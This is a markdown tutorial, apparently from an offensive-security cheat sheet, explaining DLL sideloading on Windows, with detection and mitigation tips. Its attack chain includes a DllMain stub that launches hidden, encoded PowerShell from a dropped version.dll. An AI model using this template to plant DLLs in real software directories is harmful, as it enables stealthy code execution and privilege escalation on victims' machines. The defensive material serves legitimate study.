# 🧬 DLL Sideloading (Search Order Hijack) - Living Off the Land

**DLL Sideloading** — also known as **Search Order Hijacking** — is a stealthy execution method where attackers place a malicious DLL next to a trusted application that **automatically loads it**, due to Windows' DLL search behavior.

> ⚠️ Used by APTs like APT29, Lazarus Group, and Turla. Stealthy, signed-host trusted execution with no alerts if done right.

---

## 🛠️ What It Does
- Exploits the DLL search order: Windows looks in the app’s folder *first* when loading libraries
- Legit EXEs don’t always validate DLL signatures
- By dropping a malicious DLL with a known name (e.g., `version.dll`, `winmm.dll`), it gets loaded automatically
- **No user interaction required** — just run the legit EXE

---

## 💣 Example Attack Chain

### 1. Identify a Target App
Find a signed EXE (often vendor software) that loads DLLs from its folder. Example:
```cmd
C:\Program Files\SomeVendor\App.exe
```
Check DLLs it tries to load using:
```cmd
procmon.exe
```
✅ Look for `NAME NOT FOUND` on DLLs — these are **load candidates**

---

### 2. Drop Malicious DLL as the Missing Name
Example: App tries to load `version.dll` from its directory
```cpp
BOOL APIENTRY DllMain(...) {
    WinExec("powershell -nop -w hidden -enc <payload>", 0);
    return TRUE;
}
```
✅ Compile as `version.dll`, drop in same folder as the EXE

---

### 3. Execute the EXE
```cmd
App.exe
```
✅ App runs as usual — but now it unknowingly loads and executes your DLL

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Unsigned DLLs next to signed EXEs | Flag any new DLLs in vendor directories |
| Process trees where child processes spawn from vendor EXEs | Look for unexpected `powershell.exe`, `cmd.exe` from signed tools |
| Monitoring for `LoadLibrary` of untrusted DLLs | Use Sysmon or ETW to catch suspicious library loads

---

## 🔐 Mitigation Strategies
- Use Microsoft’s `KnownDlls` and `SafeDllSearchMode`
- Monitor file integrity of vendor directories
- Sign and validate DLLs on load using application whitelisting (AppLocker/WDAC)
- Remove user write access to application folders

---

> 🧠 DLL sideloading is a trusted binary launching attacker logic — and **most AVs don’t catch it**. It’s stealth, persistence, and privilege escalation rolled into one if the target EXE runs elevated.

Welcome to the big leagues.
